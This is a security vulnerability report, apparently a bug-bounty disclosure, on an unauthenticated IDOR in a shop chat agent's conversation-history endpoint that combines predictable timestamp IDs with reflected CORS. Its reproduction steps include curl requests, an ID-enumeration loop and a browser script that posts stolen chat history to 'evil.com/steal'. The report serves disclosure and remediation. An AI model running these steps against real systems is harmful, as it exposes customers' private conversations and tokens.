# [HIGH] IDOR — Unauthenticated Access to Conversation History via conversation_id

## Ringkasan (impact nyata)
The `/chat?history=true&conversation_id=<ID>` endpoint in `shop-chat-agent` requires **no authentication** and returns the full conversation history for any conversation ID. Since conversation IDs are generated using `Date.now().toString()` (a predictable Unix timestamp), an attacker can enumerate and read any user's chat history — including messages, tool results, and potentially customer access tokens stored in the conversation context.

## Deskripsi / Root Cause
In `app/routes/chat.jsx`, the `handleHistoryRequest()` function retrieves conversation history directly from the database using a user-supplied `conversation_id` parameter **without any authentication or authorization check**:

```javascript
// app/routes/chat.jsx — handleHistoryRequest()
async function handleHistoryRequest(request, conversationId) {
  const messages = await getConversationHistory(conversationId);
  return new Response(JSON.stringify({ messages }), { headers: getCorsHeaders(request) });
}
```

The `conversationId` comes directly from the URL query parameter:

```javascript
// app/routes/chat.jsx — loader()
if (url.searchParams.has('history') && url.searchParams.has('conversation_id')) {
  return handleHistoryRequest(request, url.searchParams.get('conversation_id'));
}
```

Conversation IDs are generated using `Date.now().toString()`:

```javascript
// app/routes/chat.jsx — handleChatRequest()
const conversationId = body.conversation_id || Date.now().toString();
```

This means:
1. **No authentication**: The endpoint does not check if the requester is the conversation owner.
2. **Predictable IDs**: `Date.now()` returns a Unix timestamp in milliseconds, making IDs trivially guessable.
3. **CORS enabled**: The response includes `Access-Control-Allow-Origin: <reflected Origin>` and `Access-Control-Allow-Credentials: true`, allowing any website to read the data.

## Steps to Reproduce

### Step 1: Identify a target conversation ID
Conversation IDs are Unix timestamps in milliseconds. For example, a conversation started at `2025-05-01 12:00:00 UTC` would have ID `1746100800000`.

### Step 2: Request conversation history without authentication
```bash
curl -X GET "https://<shop-chat-agent-host>/chat?history=true&conversation_id=1746100800000" \
  -H "Origin: https://evil.com"
```

### Step 3: Receive full conversation history
```json
{
  "messages": [
    {
      "id": "msg_1",
      "conversationId": "1746100800000",
      "role": "user",
      "content": "What products do you have?",
      "createdAt": "2025-05-01T12:00:01.000Z"
    },
    {
      "id": "msg_2",
      "conversationId": "1746100800000",
      "role": "assistant",
      "content": "[{\"type\":\"text\",\"text\":\"We have...\"}]",
      "createdAt": "2025-05-01T12:00:02.000Z"
    }
  ]
}
```

### Step 4: Enumerate conversation IDs
An attacker can enumerate conversation IDs by iterating through timestamp values:

```bash
for ts in $(seq 1746100800000 1746100800100); do
  curl -s "https://<shop-chat-agent-host>/chat?history=true&conversation_id=$ts" \
    -H "Origin: https://evil.com"
done
```

### Step 5: Cross-origin exploitation
Any malicious website can read conversation history from a victim's browser:

```html
<script>
fetch("https://<shop-chat-agent-host>/chat?history=true&conversation_id=1746100800000", {
  headers: { "Origin": "https://evil.com" }
})
.then(r => r.json())
.then(data => {
  fetch("https://evil.com/steal", { method: "POST", body: JSON.stringify(data) });
});
</script>
```

## PoC / Bukti

### Source Code Evidence
**File**: `app/routes/chat.jsx`

```javascript
// No authentication check on history endpoint
export async function loader({ request }) {
  // Handle OPTIONS requests (CORS preflight)
  if (request.method === "OPTIONS") {
    return new Response(null, {
      status: 204,
      headers: getCorsHeaders(request)
    });
  }

  const url = new URL(request.url);

  // Handle history fetch requests - NO AUTH CHECK
  if (url.searchParams.has('history') && url.searchParams.has('conversation_id')) {
    return handleHistoryRequest(request, url.searchParams.get('conversation_id'));
  }
  // ...
}

async function handleHistoryRequest(request, conversationId) {
  const messages = await getConversationHistory(conversationId);
  return new Response(JSON.stringify({ messages }), { headers: getCorsHeaders(request) });
}
```

**File**: `app/db.server.js` — `getConversationHistory()`

```javascript
export async function getConversationHistory(conversationId) {
  try {
    const messages = await prisma.message.findMany({
      where: { conversationId },
      orderBy: { createdAt: 'asc' }
    });
    return messages;
  } catch (error) {
    console.error('Error retrieving conversation history:', error);
    return [];
  }
}
```

### Database Schema Evidence
**File**: `prisma/schema.prisma`

```prisma
model Conversation {
  id        String    @id
  messages  Message[]
  createdAt DateTime  @default(now())
  updatedAt DateTime  @updatedAt
}

model Message {
  id             String       @id @default(cuid())
  conversationId String
  conversation   Conversation @relation(fields: [conversationId], references: [id], onDelete: Cascade)
  role           String       // "user" or "assistant"
  content        String
  createdAt      DateTime     @default(now())

  @@index([conversationId])
}
```

## Impact (user data / finansial / reputasi — konkret)
- **Privacy violation**: An attacker can read any user's chat conversation, including questions about products, orders, shipping, and returns.
- **Token theft**: Conversation history may contain tool results that include customer access tokens or other sensitive data exchanged during the chat session.
- **Business intelligence**: An attacker can enumerate conversations to understand customer behavior, product interests, and business operations.
- **Cross-origin exploitation**: Combined with the CORS misconfiguration, any malicious website can read conversation history from a victim's browser without their knowledge.

## Remediation
1. **Require authentication** on the history endpoint — verify that the requester owns the conversation.
2. **Use unpredictable conversation IDs** — replace `Date.now().toString()` with `crypto.randomUUID()` or a cryptographically random string.
3. **Bind conversation IDs to sessions** — associate each conversation with an authenticated session and verify ownership before returning history.
4. **Fix CORS** — do not reflect arbitrary origins; use an allowlist of trusted origins.

## CVSS 3.1
**Vector**: `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N`
**Score**: 7.5 (High)

Rationale: Network exploitable, low complexity, no privileges required, no user interaction. Confidentiality impact is high (conversation history contains sensitive user data). Integrity and availability impacts are not directly affected.

## Referensi
- **CWE-639**: Authorization Bypass Through User-Controlled Key (IDOR)
- **CWE-200**: Exposure of Sensitive Information to an Unauthorized Actor
- **File**: `app/routes/chat.jsx` — `handleHistoryRequest()` and `loader()` functions
- **File**: `app/db.server.js` — `getConversationHistory()` function
- **File**: `prisma/schema.prisma` — `Conversation` and `Message` models
